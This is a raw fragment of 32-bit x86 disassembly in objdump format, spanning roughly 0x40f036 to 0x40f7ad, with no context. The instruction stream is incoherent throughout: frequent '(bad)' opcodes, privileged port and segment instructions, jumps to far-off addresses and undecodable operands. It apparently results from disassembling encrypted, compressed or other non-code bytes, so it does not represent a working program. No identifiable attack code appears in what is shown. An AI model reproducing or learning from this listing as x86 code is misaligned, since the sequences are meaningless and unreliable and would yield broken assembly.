  40f036:	or     BYTE PTR [ebp+ebx*4+0x3],al
  40f03a:	inc    esp
  40f03b:	mov    ecx,0x78e89b29
  40f040:	bound  ecx,QWORD PTR [edi-0x35]
  40f043:	mov    dl,0xb0
  40f045:	jo     0x40f059
  40f047:	dec    esp
  40f048:	mov    eax,0xf6e3b71e
  40f04d:	push   edx
  40f04e:	mov    BYTE PTR [eax],cl
  40f050:	mov    ah,BYTE PTR [esi-0x74]
  40f053:	test   esi,eax
  40f055:	sub    eax,0xbc002738
  40f05a:	pop    ecx
  40f05b:	arpl   WORD PTR [edx+0x550fe13a],cx
  40f061:	add    cx,WORD PTR [ebp-0x43ca24fb]
  40f068:	fcomp  QWORD PTR [ebx]
  40f06a:	loopne 0x40f064
  40f06c:	leave  
  40f06d:	dec    ebx
  40f06e:	fadd   QWORD PTR [edx-0x323f7747]
  40f074:	jo     0x40f061
  40f076:	bound  edx,QWORD PTR [eax+0x26b936fd]
  40f07c:	(bad)  
  40f07d:	int    0x3c
  40f07f:	std    
  40f080:	cmp    BYTE PTR [ebp-0x594a9f3d],al
  40f086:	ins    BYTE PTR es:[edi],dx
  40f087:	pop    ebp
  40f088:	out    0x4c,al
  40f08a:	test   DWORD PTR [edx],0x73cade8b
  40f090:	shl    cl,cl
  40f092:	push   0xbe9a9307
  40f097:	mov    ebx,0x4688100b
  40f09c:	aas    
  40f09d:	push   edi
  40f09e:	aad    0x1b
  40f0a0:	cwde   
  40f0a1:	cli    
  40f0a2:	adc    eax,0xcdfc7de3
  40f0a7:	mov    dl,0x90
  40f0a9:	mov    ah,dh
  40f0ab:	inc    esp
  40f0ac:	mov    bl,0xc7
  40f0ae:	or     DWORD PTR [esp+ebx*1],esp
  40f0b1:	add    al,ah
  40f0b3:	leave  
  40f0b4:	add    DWORD PTR [ecx-0x3],edi
  40f0b7:	adc    eax,0x4646b3fe
  40f0bc:	ja     0x40f06d
  40f0be:	arpl   WORD PTR [eax+ecx*4+0x1c],cx
  40f0c2:	sar    DWORD PTR [ecx],0x89
  40f0c5:	(bad)  
  40f0c6:	(bad)  
  40f0c7:	jp     0x40f09a
  40f0c9:	sar    DWORD PTR ds:0x7a3b1938,cl
  40f0cf:	repnz and DWORD PTR es:[esi],eax
  40f0d3:	jge    0x40f115
  40f0d5:	add    BYTE PTR [ebp-0x485d79a7],0x8b
  40f0dc:	sbb    al,ch
  40f0de:	and    eax,0x5bfd272f
  40f0e3:	sbb    BYTE PTR [eax],cl
  40f0e5:	mov    bh,0x7a
  40f0e7:	and    ch,BYTE PTR [esi]
  40f0e9:	pop    esp
  40f0ea:	sbb    BYTE PTR [eax],ch
  40f0ec:	fcomp  QWORD PTR [ecx+0x3a]
  40f0ef:	imul   esi,edx,0xffffffe1
  40f0f2:	push   esp
  40f0f3:	loopne 0x40f0f9
  40f0f5:	cli    
  40f0f6:	lea    ebx,[edi*2+0x7312c1be]
  40f0fd:	test   DWORD PTR [edi+ebx*1],0x73347849
  40f104:	push   0x41
  40f106:	dec    esi
  40f107:	jo     0x40f143
  40f109:	cli    
  40f10a:	in     eax,dx
  40f10b:	fwait
  40f10c:	mov    es,WORD PTR [ebp-0x235e5dc0]
  40f112:	popa   
  40f113:	pusha  
  40f114:	and    bl,cl
  40f116:	sub    esp,0xcbdaeed5
  40f11c:	ins    DWORD PTR es:[edi],dx
  40f11d:	cmp    al,bl
  40f11f:	jmp    0xb596b81
  40f124:	push   es
  40f125:	jp     0x40f0c9
  40f127:	ins    DWORD PTR es:[edi],dx
  40f128:	in     eax,dx
  40f129:	xchg   DWORD PTR [esi+ebx*2-0x38],ecx
  40f12d:	add    BYTE PTR [edx-0x32eb9328],bl
  40f133:	jns    0x40f0c2
  40f135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f136:	(bad)  
  40f138:	or     BYTE PTR [edi+ecx*8+0x59],bl
  40f13c:	ret    0xa29
  40f13f:	ja     0x40f116
  40f141:	das    
  40f142:	arpl   WORD PTR [ebp-0x65],bp
  40f145:	cwde   
  40f146:	mov    es,ebx
  40f148:	cmp    DWORD PTR [ecx+edx*1],edx
  40f14b:	stc    
  40f14c:	in     eax,dx
  40f14d:	or     dl,cl
  40f14f:	push   ebp
  40f150:	pop    ds
  40f151:	xor    dl,BYTE PTR [ebx+ebx*4+0x1356c086]
  40f158:	push   ds
  40f159:	pop    esp
  40f15a:	lahf   
  40f15b:	add    ebp,DWORD PTR [ecx+0x50dd5bbc]
  40f161:	fcomp  st(1)
  40f163:	out    0xa8,al
  40f165:	xlat   BYTE PTR ds:[ebx]
  40f166:	adc    ecx,DWORD PTR [ebx]
  40f168:	mov    al,ds:0xc497991e
  40f16d:	jno    0x40f192
  40f16f:	or     DWORD PTR [edi+0x75],0xffffffe5
  40f173:	cwde   
  40f174:	sub    al,0x67
  40f176:	in     eax,0x2d
  40f178:	(bad)  
  40f179:	aad    0x81
  40f17b:	fwait
  40f17c:	rcl    eax,cl
  40f17e:	xchg   esp,eax
  40f17f:	or     al,0xc9
  40f181:	cdq    
  40f182:	(bad)  
  40f183:	clc    
  40f184:	xor    al,0xe8
  40f186:	outs   dx,BYTE PTR ds:[esi]
  40f187:	or     al,0x43
  40f189:	sbb    DWORD PTR [esi],esi
  40f18b:	xchg   DWORD PTR [ebx-0x4c53843c],esi
  40f191:	mov    bh,0xc9
  40f193:	stos   BYTE PTR es:[edi],al
  40f194:	imul   ecx,edi,0x1d3af048
  40f19a:	int    0x3
  40f19c:	sahf   
  40f19d:	push   esp
  40f19e:	arpl   WORD PTR [esi+0x4f],bp
  40f1a1:	and    DWORD PTR [ebx],0x459df3c0
  40f1a7:	cwde   
  40f1a8:	addr16 aam 0x24
  40f1ab:	jne    0x40f200
  40f1ad:	mov    ?,WORD PTR [ecx+0x1332003f]
  40f1b3:	jp     0x40f1f6
  40f1b5:	mov    al,ds:0xb5866349
  40f1ba:	rol    BYTE PTR [esi-0x343beb98],1
  40f1c0:	rcl    BYTE PTR [ebx-0x7b10c732],0x19
  40f1c7:	mov    BYTE PTR [eax+0x54],cl
  40f1ca:	in     al,dx
  40f1cb:	lods   eax,DWORD PTR ds:[esi]
  40f1cc:	bswap  edi
  40f1ce:	inc    ecx
  40f1cf:	repnz hlt 
  40f1d1:	sbb    al,0xb5
  40f1d3:	lea    eax,[edi-0x790a21a1]
  40f1d9:	aad    0x64
  40f1db:	lock ror bl,cl
  40f1de:	jg     0x40f24f
  40f1e0:	out    0x51,al
  40f1e2:	jmp    0x40f1f7
  40f1e4:	es jp  0x40f1fa
  40f1e7:	sub    dl,dh
  40f1e9:	inc    edx
  40f1ea:	dec    esp
  40f1eb:	cdq    
  40f1ec:	add    al,0x4c
  40f1ee:	gs out dx,al
  40f1f0:	mov    DWORD PTR [ecx+eax*2+0x15],ecx
  40f1f4:	sub    eax,esp
  40f1f6:	fisubr WORD PTR [ebx]
  40f1f8:	sub    BYTE PTR [edx+0x3bc53674],dh
  40f1fe:	sti    
  40f1ff:	push   edi
  40f200:	dec    ebp
  40f201:	hlt    
  40f202:	mov    eax,ds:0x406575bb
  40f207:	pop    esp
  40f208:	sub    BYTE PTR [eax],0xc2
  40f20b:	out    0x45,eax
  40f20d:	jle    0x40f28c
  40f20f:	stos   DWORD PTR es:[edi],eax
  40f210:	test   DWORD PTR [eax],0xf6be218c
  40f216:	cli    
  40f217:	int    0xc0
  40f219:	jae    0x40f213
  40f21b:	les    edi,FWORD PTR [edi+0x4a]
  40f21e:	pop    esp
  40f21f:	out    dx,al
  40f220:	and    ecx,eax
  40f222:	inc    edi
  40f223:	jne    0x40f208
  40f225:	fadd   DWORD PTR [edx+edi*8]
  40f228:	leave  
  40f229:	pop    edi
  40f22a:	imul   edx,DWORD PTR [ecx-0x35],0xc5cd29c7
  40f231:	fmul   st,st(1)
  40f233:	(bad)  
  40f235:	ror    DWORD PTR [ebx-0x3e],cl
  40f238:	popa   
  40f239:	stos   BYTE PTR es:[edi],al
  40f23a:	fist   WORD PTR [edx+0x7]
  40f23d:	das    
  40f23e:	fstp   DWORD PTR [edi+0x3f]
  40f241:	or     DWORD PTR [ebx],ebx
  40f243:	cdq    
  40f244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f245:	push   0x68
  40f247:	mov    cl,0x5f
  40f249:	clc    
  40f24a:	call   0xf6330bf6
  40f24f:	jo     0x40f23c
  40f251:	or     dh,BYTE PTR [edx]
  40f253:	inc    ebp
  40f254:	enter  0xb602,0xbf
  40f258:	inc    esp
  40f259:	daa    
  40f25a:	je     0x40f23b
  40f25c:	and    bl,bl
  40f25e:	add    BYTE PTR [ecx+0x1381bcb5],0x71
  40f265:	rol    DWORD PTR [ebx+ecx*2-0x3c],cl
  40f269:	cmp    esi,DWORD PTR [edi-0x7d]
  40f26c:	sbb    DWORD PTR [eax-0x1f],edx
  40f26f:	and    ecx,edi
  40f271:	mov    ebp,0x9965a993
  40f276:	mov    ebp,DWORD PTR [edx-0x73]
  40f279:	mov    esp,0xf0217e12
  40f27e:	cli    
  40f27f:	push   esi
  40f280:	addr16 add ebx,eax
  40f283:	push   0x75
  40f285:	cmp    eax,ecx
  40f287:	push   edx
  40f288:	adc    ch,BYTE PTR [ebx-0xd]
  40f28b:	in     eax,dx
  40f28c:	add    esi,DWORD PTR [esi-0x3121d835]
  40f292:	adc    eax,0x7ccd3098
  40f297:	retf   0xbff1
  40f29a:	scas   eax,DWORD PTR es:[edi]
  40f29b:	add    edi,edx
  40f29d:	arpl   WORD PTR [ebx-0x52ff8934],cx
  40f2a3:	pandn  mm7,mm0
  40f2a6:	mov    cl,0x33
  40f2a8:	mov    esi,DWORD PTR [ebx+0x6a]
  40f2ab:	repnz fnstenv [esi+0x6d]
  40f2af:	sub    DWORD PTR [edi+esi*8-0xe3cbd5d],0x9b30f079
  40f2ba:	mul    DWORD PTR [ebp+0x6182ea6b]
  40f2c0:	(bad)  
  40f2c1:	aas    
  40f2c2:	sbb    BYTE PTR [edi-0x111a939d],dl
  40f2c8:	and    BYTE PTR [ecx+ebx*4+0x36],bl
  40f2cc:	ins    BYTE PTR es:[edi],dx
  40f2cd:	mov    ebp,0xaee997da
  40f2d2:	rcl    BYTE PTR [ebp+0x24cd9902],0xdd
  40f2d9:	arpl   si,di
  40f2db:	loope  0x40f2de
  40f2dd:	lods   eax,DWORD PTR ds:[esi]
  40f2de:	shr    bl,1
  40f2e0:	xchg   DWORD PTR [edx],esp
  40f2e2:	adc    DWORD PTR [esi+0x7b347c09],esp
  40f2e8:	loopne 0x40f366
  40f2ea:	lods   eax,DWORD PTR ds:[esi]
  40f2eb:	xchg   BYTE PTR [ebx-0xc],dh
  40f2ee:	mov    edi,0x493f00ac
  40f2f3:	sub    DWORD PTR [edx+0x47],esi
  40f2f6:	jbe    0x40f30f
  40f2f8:	(bad)  
  40f2f9:	dec    esi
  40f2fa:	jecxz  0x40f31f
  40f2fc:	std    
  40f2fd:	mov    ch,dl
  40f2ff:	or     DWORD PTR [eax],eax
  40f301:	fst    QWORD PTR [edi+0x4f55592d]
  40f307:	rcr    eax,0x3f
  40f30a:	push   eax
  40f30b:	xchg   ecx,eax
  40f30c:	sahf   
  40f30d:	js     0x40f2c4
  40f30f:	stos   DWORD PTR es:[edi],eax
  40f310:	fsubr  QWORD PTR [edx-0x72868383]
  40f316:	and    esp,DWORD PTR [eax]
  40f318:	loop   0x40f36b
  40f31a:	lahf   
  40f31b:	cmp    DWORD PTR [ecx-0x2eec08e7],edi
  40f321:	(bad)  
  40f322:	push   esi
  40f323:	popf   
  40f324:	pop    ss
  40f325:	jb     0x40f365
  40f327:	fnstcw WORD PTR [edi+ebp*1+0x73539214]
  40f32e:	mov    ebp,0x98789315
  40f333:	stc    
  40f334:	sbb    dl,BYTE PTR [eax-0x1b0782c0]
  40f33a:	add    DWORD PTR [eax+0x44bde4f9],ebx
  40f340:	ins    BYTE PTR es:[edi],dx
  40f341:	fs cmc 
  40f343:	fadd   QWORD PTR [ebx+edx*1-0x24]
  40f347:	pop    ds
  40f348:	xchg   ebx,esp
  40f34a:	test   eax,0xe0e0bd32
  40f34f:	mov    ?,WORD PTR [edx+ebx*8-0x73050aa0]
  40f356:	fwait
  40f357:	push   0x1731424f
  40f35c:	sbb    esp,DWORD PTR [eax]
  40f35e:	cs sbb eax,0x89c6ebcc
  40f364:	or     cl,BYTE PTR [ecx+0x5f33b83b]
  40f36a:	imul   esp,DWORD PTR [eax-0x69876516],0xffffff92
  40f371:	cmp    al,0xf3
  40f373:	call   0xc3a3:0x19e7a4cb
  40f37a:	(bad)  
  40f37b:	fld    st(7)
  40f37d:	idiv   DWORD PTR [edx-0x5cef8fdd]
  40f383:	pusha  
  40f384:	jmp    0x3213:0x7aebfdf8
  40f38b:	cmc    
  40f38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f38d:	mov    ch,0xf
  40f38f:	ja     0x40f32a
  40f391:	ret    0x6d61
  40f394:	arpl   WORD PTR [ecx],sp
  40f396:	or     BYTE PTR [edx],0xa7
  40f399:	or     BYTE PTR [ebp+0x7],cl
  40f39c:	js     0x40f373
  40f39e:	or     edi,DWORD PTR [edi]
  40f3a0:	outs   dx,DWORD PTR ds:[esi]
  40f3a1:	xor    BYTE PTR [edx],ch
  40f3a3:	test   DWORD PTR [eax-0x2bf8e257],ecx
  40f3a9:	stos   DWORD PTR es:[edi],eax
  40f3aa:	or     al,0xe
  40f3ac:	jbe    0x40f41a
  40f3ae:	aam    0x51
  40f3b0:	dec    edx
  40f3b1:	fcomip st,st(2)
  40f3b3:	sbb    eax,0xf9648d9f
  40f3b8:	push   eax
  40f3b9:	dec    ebx
  40f3ba:	in     al,0xe8
  40f3bc:	push   ebx
  40f3bd:	xchg   edx,eax
  40f3be:	xchg   ecx,eax
  40f3bf:	fsubr  QWORD PTR [ebp-0x76]
  40f3c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3c3:	sub    al,0x34
  40f3c5:	dec    esp
  40f3c6:	sbb    DWORD PTR ds:0x7aa5bd8a,edx
  40f3cc:	gs das 
  40f3ce:	std    
  40f3cf:	out    0x85,eax
  40f3d1:	out    dx,eax
  40f3d2:	test   DWORD PTR [eax+0x20],ebp
  40f3d5:	and    eax,0xbb89cffe
  40f3da:	stc    
  40f3db:	int3   
  40f3dc:	sahf   
  40f3dd:	ss push 0xfffffffa
  40f3e0:	inc    esi
  40f3e1:	mov    ebp,0x50cb0435
  40f3e6:	push   ecx
  40f3e7:	fbld   TBYTE PTR [edi]
  40f3e9:	push   ss
  40f3ea:	repz sahf 
  40f3ec:	scas   al,BYTE PTR es:[edi]
  40f3ed:	adc    BYTE PTR [eax+0x6c],0x66
  40f3f1:	(bad)  
  40f3f2:	pop    ss
  40f3f3:	popf   
  40f3f4:	lds    esi,FWORD PTR [eax+0x57]
  40f3f7:	sbb    eax,ecx
  40f3f9:	push   edx
  40f3fa:	cs stc 
  40f3fc:	xchg   BYTE PTR [esi+edi*4],ch
  40f3ff:	adc    al,0xe5
  40f401:	xor    BYTE PTR [ecx],0xd3
  40f404:	push   0x7bb98f9f
  40f409:	push   ebx
  40f40a:	sub    DWORD PTR [ebp+0x4f],esp
  40f40d:	and    al,0xf9
  40f40f:	sub    al,0xdf
  40f411:	fwait
  40f412:	into   
  40f413:	clc    
  40f414:	cmp    eax,0xb270dd06
  40f419:	(bad)  
  40f41a:	aad    0xe3
  40f41c:	jge    0x40f464
  40f41e:	dec    ecx
  40f41f:	ret    0x9a1a
  40f422:	rcr    dh,0xa
  40f425:	(bad)  
  40f426:	fwait
  40f427:	pop    edi
  40f428:	jnp    0x40f3e9
  40f42a:	jmp    0x6bd2e77d
  40f42f:	pop    edx
  40f430:	(bad)  
  40f431:	xchg   esi,eax
  40f432:	ror    dh,1
  40f434:	sbb    DWORD PTR [edx-0x33],edi
  40f437:	pop    edi
  40f438:	arpl   WORD PTR [ebx+ebx*2+0x3b],bx
  40f43c:	and    DWORD PTR [ebx-0x2e],edi
  40f43f:	addr16 mov dl,0x5f
  40f442:	pushf  
  40f443:	push   esp
  40f444:	repnz add eax,0x3d0d0314
  40f44a:	gs push eax
  40f44c:	pop    ebp
  40f44d:	pop    es
  40f44e:	pop    esi
  40f44f:	mov    ds:0x61cc0de8,al
  40f454:	repnz lods eax,DWORD PTR ds:[esi]
  40f456:	imul   ebp,DWORD PTR [edi-0x7574d726],0xaf7744cc
  40f460:	sub    al,0x77
  40f462:	sbb    eax,0xf26c43f2
  40f468:	fidivr WORD PTR [ecx-0x3f984e5b]
  40f46e:	das    
  40f46f:	xlat   BYTE PTR ds:[ebx]
  40f470:	push   esp
  40f471:	dec    edx
  40f472:	jns    0x40f43a
  40f474:	iret   
  40f475:	dec    edx
  40f476:	xlat   BYTE PTR ds:[ebx]
  40f477:	fiadd  WORD PTR [ebp+0x42]
  40f47a:	bound  edx,QWORD PTR [ecx+edx*2+0x1de34e86]
  40f481:	or     ebx,DWORD PTR [esi+ebx*8]
  40f484:	aas    
  40f485:	int3   
  40f486:	pusha  
  40f487:	add    DWORD PTR [ebx-0x6c],esp
  40f48a:	jnp    0x40f4f0
  40f48c:	or     al,0xa0
  40f48e:	in     al,0xc0
  40f490:	enter  0x4cd4,0x6
  40f494:	outs   dx,BYTE PTR ds:[esi]
  40f495:	out    0x1a,eax
  40f497:	lea    esi,[edi-0x437664d5]
  40f49d:	inc    eax
  40f49e:	mov    ebp,0xf15de5a9
  40f4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a4:	mov    WORD PTR [ecx+0x1e],ss
  40f4a7:	pminub mm2,QWORD PTR [edi]
  40f4aa:	in     eax,dx
  40f4ab:	loopne 0x40f48c
  40f4ad:	and    DWORD PTR [edi+0x17],esi
  40f4b0:	in     al,0x45
  40f4b2:	jne    0x40f4a8
  40f4b4:	sub    cl,BYTE PTR [eax+0x77]
  40f4b7:	lea    esi,[esi-0x1a]
  40f4ba:	out    dx,eax
  40f4bb:	xlat   BYTE PTR ds:[ebx]
  40f4bc:	mov    al,0x5a
  40f4be:	xor    DWORD PTR [edx+0x75],ecx
  40f4c1:	inc    edi
  40f4c2:	jg     0x40f44e
  40f4c4:	sbb    DWORD PTR ds:0x114b8216,0xffffffdc
  40f4cb:	std    
  40f4cc:	into   
  40f4cd:	mov    esp,DWORD PTR [edx]
  40f4cf:	popa   
  40f4d0:	and    eax,0xc58c79fa
  40f4d5:	aas    
  40f4d6:	inc    edx
  40f4d7:	cmp    DWORD PTR [eax+0x2a07f70f],ebx
  40f4dd:	test   DWORD PTR [esi-0x79],ebp
  40f4e0:	arpl   WORD PTR [edi+0x4a],ax
  40f4e3:	mov    cl,BYTE PTR [ebx]
  40f4e5:	retf   0x71b6
  40f4e8:	xchg   esp,eax
  40f4e9:	mov    dh,0x62
  40f4eb:	or     dl,BYTE PTR [ebx-0x30]
  40f4ee:	ret    
  40f4ef:	adc    BYTE PTR [esi+0x7696219d],ch
  40f4f5:	scas   al,BYTE PTR es:[edi]
  40f4f6:	mov    edx,0xd554793
  40f4fb:	into   
  40f4fc:	jl     0x40f4b4
  40f4fe:	mov    edx,DWORD PTR [edx]
  40f500:	mov    eax,0xd417a01f
  40f505:	fidivr DWORD PTR ds:[edx-0x2c]
  40f509:	inc    ebp
  40f50a:	(bad)  
  40f50b:	pop    edx
  40f50c:	add    ch,BYTE PTR [esi-0x23]
  40f50f:	push   0xffffffdc
  40f511:	jp     0x40f4be
  40f513:	sbb    edx,DWORD PTR [eax]
  40f515:	mov    bh,ch
  40f517:	cmp    BYTE PTR [edi+0x17adcb51],ah
  40f51d:	gs int3 
  40f51f:	jns    0x40f4c9
  40f521:	mov    edx,cr2
  40f524:	into   
  40f525:	xor    eax,0xf27a6ce7
  40f52a:	push   ds
  40f52b:	mov    bl,0x5b
  40f52d:	ret    0x6feb
  40f530:	das    
  40f531:	enter  0xb36,0xd0
  40f535:	and    DWORD PTR [edi-0x4d48b60d],esp
  40f53b:	je     0x40f4d9
  40f53d:	outs   dx,DWORD PTR ds:[esi]
  40f53e:	mov    ds:0xe997cf2f,eax
  40f543:	mov    edi,0xbe99421a
  40f548:	pop    ds
  40f549:	xor    DWORD PTR [ebx+0x9],esi
  40f54c:	push   ecx
  40f54d:	adc    al,0x9c
  40f54f:	push   ebp
  40f550:	shl    DWORD PTR [edi+0x2d41ff55],cl
  40f556:	test   BYTE PTR ss:[edx+0x1e],dh
  40f55a:	jp     0x40f5b0
  40f55c:	in     eax,dx
  40f55d:	loope  0x40f4f3
  40f55f:	push   ebp
  40f560:	(bad)  
  40f561:	aad    0x95
  40f563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f564:	jle    0x40f524
  40f566:	int3   
  40f567:	mov    ebp,0x5338c47e
  40f56c:	mov    ecx,ebx
  40f56e:	mov    esi,fs
  40f570:	sbb    al,0xca
  40f572:	jecxz  0x40f515
  40f574:	sub    eax,0xd0f8652
  40f579:	xchg   ebp,eax
  40f57a:	(bad)  
  40f57b:	(bad)  [esi+0x13aeb1fc]
  40f581:	mov    edx,0xa1850b05
  40f586:	stos   DWORD PTR es:[edi],eax
  40f587:	push   es
  40f588:	or     dl,BYTE PTR [ebx]
  40f58a:	pop    esi
  40f58b:	(bad)  
  40f58c:	push   eax
  40f58d:	add    ebx,eax
  40f58f:	adc    al,0xd2
  40f591:	mov    dl,BYTE PTR [ecx-0x5e]
  40f594:	dec    edi
  40f595:	sub    ch,dl
  40f597:	and    eax,0x2974f395
  40f59c:	imul   ebp,DWORD PTR [eax+0x7129843f],0xc86ba88d
  40f5a6:	dec    edi
  40f5a7:	mov    al,0x9d
  40f5a9:	popf   
  40f5aa:	icebp  
  40f5ab:	add    ebp,edx
  40f5ad:	jmp    0xd7bf8031
  40f5b2:	push   cs
  40f5b3:	mov    gs,WORD PTR [ebp+edx*8-0x5d]
  40f5b7:	mov    esp,0x1e9affdd
  40f5bc:	sbb    ah,0xb
  40f5bf:	push   0xffffff87
  40f5c1:	push   cs
  40f5c2:	out    0x18,eax
  40f5c4:	leave  
  40f5c5:	stc    
  40f5c6:	push   ebx
  40f5c7:	pop    ss
  40f5c8:	mov    ds:0x866a3560,eax
  40f5cd:	push   0xfffffffb
  40f5cf:	imul   eax,DWORD PTR [edx],0xcf55ee70
  40f5d5:	pop    esp
  40f5d6:	enter  0x1163,0x6
  40f5da:	mov    ?,WORD PTR es:[esi+ebx*1-0x21]
  40f5df:	adc    al,BYTE PTR [ebx+0x2441af25]
  40f5e5:	test   DWORD PTR [edi],ebx
  40f5e7:	neg    bl
  40f5e9:	mov    edi,DWORD PTR [ecx+0x27bf8e2b]
  40f5ef:	das    
  40f5f0:	retf   
  40f5f1:	das    
  40f5f2:	ds push esp
  40f5f4:	repz jns 0x40f5a7
  40f5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5f8:	jg     0x40f5fb
  40f5fa:	aad    0x60
  40f5fc:	and    edx,DWORD PTR [ecx+0x7b22568f]
  40f602:	stos   DWORD PTR es:[edi],eax
  40f603:	sub    cl,al
  40f605:	push   ecx
  40f606:	push   edi
  40f607:	ret    
  40f608:	cmp    eax,DWORD PTR [edi]
  40f60a:	mov    dl,0xb9
  40f60c:	mov    cl,0x57
  40f60e:	inc    edi
  40f60f:	shl    WORD PTR [eax],1
  40f612:	xor    bh,bh
  40f614:	(bad)  [esi+eax*4-0x54]
  40f618:	in     al,0x8a
  40f61a:	inc    ecx
  40f61b:	rol    ecx,0x93
  40f61e:	jb     0x40f693
  40f620:	fadd   QWORD PTR [ecx]
  40f622:	(bad)  [esi]
  40f624:	or     eax,0x7b2eb400
  40f629:	sti    
  40f62a:	xchg   BYTE PTR [edx+0x52],ah
  40f62d:	sub    esi,esp
  40f62f:	cwde   
  40f630:	fs adc eax,0x1dc46bab
  40f636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f637:	icebp  
  40f638:	sbb    ebp,ecx
  40f63a:	pop    esi
  40f63b:	(bad)  
  40f63c:	cld    
  40f63d:	clc    
  40f63e:	shl    BYTE PTR ds:0xb7a4dcfa,0x82
  40f645:	int3   
  40f646:	outs   dx,BYTE PTR ds:[esi]
  40f647:	fidivr WORD PTR [ecx+0x1246a183]
  40f64d:	ds inc ecx
  40f64f:	out    0x1,al
  40f651:	push   edx
  40f652:	mov    ss,WORD PTR [ebx]
  40f654:	pop    esp
  40f655:	push   ds
  40f656:	retf   
  40f657:	(bad)  
  40f659:	out    0xc5,al
  40f65b:	outs   dx,BYTE PTR ds:[esi]
  40f65c:	mov    ds:0xc94bd589,al
  40f661:	push   ds
  40f662:	cmp    DWORD PTR [esi-0x646efdaf],0x575e656e
  40f66c:	sti    
  40f66d:	adc    al,0x94
  40f66f:	leave  
  40f670:	xchg   edi,eax
  40f671:	leave  
  40f672:	out    dx,al
  40f673:	mov    cl,0x5b
  40f675:	dec    ecx
  40f676:	adc    DWORD PTR [ebp-0x3155dbd2],ebx
  40f67c:	inc    edx
  40f67d:	push   DWORD PTR [edx+eiz*1+0x1dc1aba7]
  40f684:	out    0x84,eax
  40f686:	dec    edi
  40f687:	(bad)  
  40f688:	jnp    0x40f621
  40f68a:	loop   0x40f6a4
  40f68c:	sub    BYTE PTR [edi-0x12cf855],bl
  40f692:	push   0x9c2a07cf
  40f697:	pextrw ebp,(bad),0xc5
  40f699:	push   0xaf061ae4
  40f69e:	dec    edx
  40f69f:	mov    ch,0x13
  40f6a1:	pop    ebx
  40f6a2:	inc    eax
  40f6a3:	shl    DWORD PTR [ebp-0x2e61df87],0x95
  40f6aa:	jns    0x40f635
  40f6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6ad:	nop
  40f6ae:	ror    DWORD PTR [ebp+0x37],1
  40f6b1:	pop    ds
  40f6b2:	aad    0xf4
  40f6b4:	inc    ebx
  40f6b5:	push   eax
  40f6b6:	in     al,dx
  40f6b7:	mov    ds:0x486c664a,al
  40f6bc:	pop    eax
  40f6bd:	je     0x40f73c
  40f6bf:	neg    DWORD PTR es:[esi]
  40f6c2:	pop    ebx
  40f6c3:	jno    0x40f6dd
  40f6c5:	pop    es
  40f6c6:	jb     0x40f71f
  40f6c8:	mov    ds:0x391f0da4,al
  40f6cd:	data16 rcr BYTE PTR [esi],0xef
  40f6d1:	inc    esp
  40f6d2:	jae    0x40f73c
  40f6d4:	push   eax
  40f6d5:	sub    eax,0xdc7006ca
  40f6da:	outs   dx,BYTE PTR ds:[esi]
  40f6db:	in     al,dx
  40f6dc:	(bad)  
  40f6dd:	jmp    0xf65d:0xc039f153
  40f6e4:	ret    
  40f6e5:	cmp    DWORD PTR [ecx-0x77],ebx
  40f6e8:	sbb    BYTE PTR [esi-0x7832fbca],ch
  40f6ee:	sbb    edi,DWORD PTR [edi-0x71]
  40f6f1:	mov    bh,0x13
  40f6f3:	ss jno 0x40f74e
  40f6f6:	jecxz  0x40f6cc
  40f6f8:	mov    dl,0xe2
  40f6fa:	cvtdq2ps xmm7,XMMWORD PTR [ebx+0x35]
  40f6fe:	pop    esi
  40f6ff:	mov    esp,eax
  40f701:	or     DWORD PTR [edx],edi
  40f703:	inc    eax
  40f704:	or     DWORD PTR [ebx+0x6e],0x19bc5dfc
  40f70b:	es icebp 
  40f70d:	and    DWORD PTR [ecx-0x5bde057],0x77dc1741
  40f717:	pop    ebx
  40f718:	stos   DWORD PTR es:[edi],eax
  40f719:	int    0xf0
  40f71b:	adc    ebp,DWORD PTR [ebx-0x3c822695]
  40f721:	xchg   bl,bl
  40f723:	mov    ds:0x9e74c4a,al
  40f728:	inc    ebp
  40f729:	pusha  
  40f72a:	mov    eax,ds:0xb1d3f9d0
  40f72f:	arpl   WORD PTR [edi+0x3ba34717],sp
  40f735:	mov    bh,0x82
  40f737:	and    eax,DWORD PTR [edi+0x2c4fdfff]
  40f73d:	bound  edx,QWORD PTR [esi+0x657c310]
  40f743:	js     0x40f6d5
  40f745:	xor    BYTE PTR [ecx-0x42762f74],cl
  40f74b:	cmp    eax,0x2b6eec2a
  40f750:	sub    DWORD PTR [ebx+0x7e],esp
  40f753:	jle    0x40f760
  40f755:	pop    edi
  40f756:	lods   eax,DWORD PTR ds:[esi]
  40f757:	cmp    eax,0x472966ad
  40f75c:	ins    BYTE PTR es:[edi],dx
  40f75d:	push   ss
  40f75e:	or     BYTE PTR [ecx+0x55],cl
  40f761:	cmp    BYTE PTR ds:0xa1001412,bl
  40f767:	fcmovu st,st(6)
  40f769:	pop    edi
  40f76a:	test   al,0x80
  40f76c:	push   ebx
  40f76d:	mov    esi,0x785b0472
  40f772:	push   edi
  40f773:	imul   edx,ecx,0x2026c627
  40f779:	loop   0x40f794
  40f77b:	sbb    eax,0xf06144e2
  40f780:	dec    ebp
  40f781:	scas   al,BYTE PTR es:[edi]
  40f782:	loop   0x40f770
  40f784:	mov    eax,ds:0x3043468e
  40f789:	jmp    0x40f73e
  40f78b:	mov    ah,0x13
  40f78d:	shl    BYTE PTR [ecx+0x1],cl
  40f790:	stc    
  40f791:	lahf   
  40f792:	fwait
  40f793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f794:	or     al,0x8d
  40f796:	lods   al,BYTE PTR ds:[esi]
  40f797:	jge    0x40f7a9
  40f799:	push   ecx
  40f79a:	loop   0x40f7a4
  40f79c:	pusha  
  40f79d:	es stc 
  40f79f:	jns    0x40f7b3
  40f7a1:	pop    esp
  40f7a2:	aas    
  40f7a3:	out    dx,eax
  40f7a4:	dec    edx
  40f7a5:	jne    0x40f730
  40f7a7:	mov    ebx,0x66e861e9
  40f7ac:	pop    edx
  40f7ad:	pop    ds
